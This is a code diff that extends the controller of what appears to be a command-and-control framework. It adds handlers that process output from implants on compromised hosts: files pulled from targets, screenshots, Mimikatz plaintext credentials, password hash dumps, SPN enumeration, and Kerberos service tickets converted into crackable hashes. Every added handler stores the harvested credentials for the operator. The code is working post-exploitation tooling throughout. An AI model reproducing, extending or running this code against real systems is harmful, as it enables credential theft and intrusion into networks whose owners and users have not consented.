@@ -20,6 +20,7 @@ import os, sys, getopt
 import traceback
 import time, datetime
 import base64
+import hashlib
 
 # LIBS
 from lib.global_data import *
@@ -33,6 +34,7 @@ class Control():
     def get_global(self):
         print gdata.target
     
+    # SET COMMAND TO BE SENT TO THE AGENT/TARGET
     def set_command(self, param, param_target):
         # IMPORT A POWERSHELL MODULE ON THE TARGET
         if param.startswith("powershell-import"):
@@ -212,3 +214,148 @@ class Control():
             gdata.target[param_target]["exec"] = _exec
             
         return _exec
+    
+    # PROCESS RESPONSE FROM AGENT/TARGET 
+    def get_response(self, content, last_command, uuid):
+        # DOWNLOADED FILE FROM AGENT
+        if last_command.startswith("download "):
+            timestamp = int(time.time())
+            filename = last_command.split("|")[0].replace("download ","")
+            filename = "%s_%s_%s" % (uuid, timestamp, filename)
+            data = content.split(" ")
+            with open('data/downloads/'+filename, 'wb') as f:
+                for i in data:
+                    f.write(chr(int(i)))
+            content = "download: %s\n\n" % filename
+        
+        # TAKE SCREENSHOT
+        if last_command.startswith("screenshot"):
+            timestamp = int(time.time())
+            filename = "%s_%s" % (uuid, timestamp)
+            data = base64.b64decode(content)
+            with open("data/screenshots/%s.png" % filename, "wb") as f:
+                f.write(data)
+            content = "screenshot: %s.png \n\n" % filename
+        
+        # DUMP CREDS WITH MIMIKATZ
+        if last_command == ("mimikatz"):
+            output = ""
+            for item in parse_mimikatz(content):
+                v_type = item[0]
+                v_domain = item[1]
+                v_user = item[2]
+                v_pass = item[3]
+                v_host = gdata.target[uuid]["name"]
+                
+                h = hashlib.md5()
+                h_data = "%s%s%s%s%s" % (v_type, v_domain, v_user, v_pass, v_host)
+                h.update(h_data)
+                v_id = h.hexdigest()
+                
+                gdata.credentials[v_id] = {
+                    "type": v_type,
+                    "domain": v_domain,
+                    "user": v_user,
+                    "pass": v_pass,
+                    "host": v_host,
+                    "source": "mimikatz"
+                }
+                
+                output += "%s:%s:%s:%s:%s\n" % (v_type, v_domain, v_user, v_pass, v_host)
+            
+            store_credentials()
+            
+            content = "mimikatz ;) \n\n"
+            content += output + "\n"
+        
+        # DUMP HASHES
+        if last_command.startswith("hashdump"):
+            data = content.split("\n")
+            
+            for values in data:
+                if values != "":
+                    item = values.split(":")
+                    
+                    v_type = "hash"
+                    v_domain = ""
+                    v_user = item[0]
+                    v_pass = item[3]
+                    v_host = gdata.target[uuid]["name"]
+                    
+                    h = hashlib.md5()
+                    h_data = "%s%s%s%s%s" % (v_type, v_domain, v_user, v_pass, v_host)
+                    h.update(h_data)
+                    v_id = h.hexdigest()
+                    
+                    gdata.credentials[v_id] = {
+                        "type": v_type,
+                        "domain": v_domain,
+                        "user": v_user,
+                        "pass": v_pass,
+                        "host": v_host,
+                        "source": "hashdump"
+                    }
+            
+            store_credentials()
+        
+        # SEARCH SPNs
+        if last_command.startswith("spn_search"):
+            data = content.split("\n")
+            output = ""
+            
+            for values in data:
+                if values != "":
+                    item = values.split("|")
+                    
+                    v_samaccountname = item[0]
+                    v_serviceprincipalname = item[1]
+                    v_host = gdata.target[uuid]["name"]
+                    
+                    h = hashlib.md5()
+                    h_data = "%s%s" % (v_samaccountname, v_serviceprincipalname)
+                    h.update(h_data)
+                    v_id = h.hexdigest()
+                    
+                    gdata.credentials_spn[v_id] = {
+                        "samaccountname": v_samaccountname,
+                        "serviceprincipalname": v_serviceprincipalname
+                    }
+                    
+                    output += "samaccountname: %s\n" % v_samaccountname
+                    output += "serviceprincipalname: %s\n" % v_serviceprincipalname
+                    output += "\n"
+                    
+            store_credentials_spn()
+            
+            content = "get_spn ;) \n\n" + output
+        
+        # DUMP KERBEROS TGT & TGS WITH MIMIKATZ
+        if last_command.startswith("kerberos_ticket_dump"):
+            data = mimikatz2kirbi(content).split("\n")
+            output = ""
+            
+            for values in data:
+                if values != "":
+                    
+                    v_servername = values.split(":")[0].replace("$krb5tgs$","")
+                    v_john = values
+                    v_host = gdata.target[uuid]["name"]
+                    
+                    h = hashlib.md5()
+                    h_data = "%s%s%s" % (v_servername, v_john, v_host)
+                    h.update(h_data)
+                    v_id = h.hexdigest()
+                    
+                    gdata.credentials_ticket[v_id] = {
+                        "servername": v_servername,
+                        "john": v_john,
+                        "host": v_host
+                    }
+                    
+                    output += "servername: %s\n" % v_servername
+                    
+            store_credentials_ticket()
+            
+            content = "kerberos_ticket_dump ;) \n\n" + output
+        
+        return content
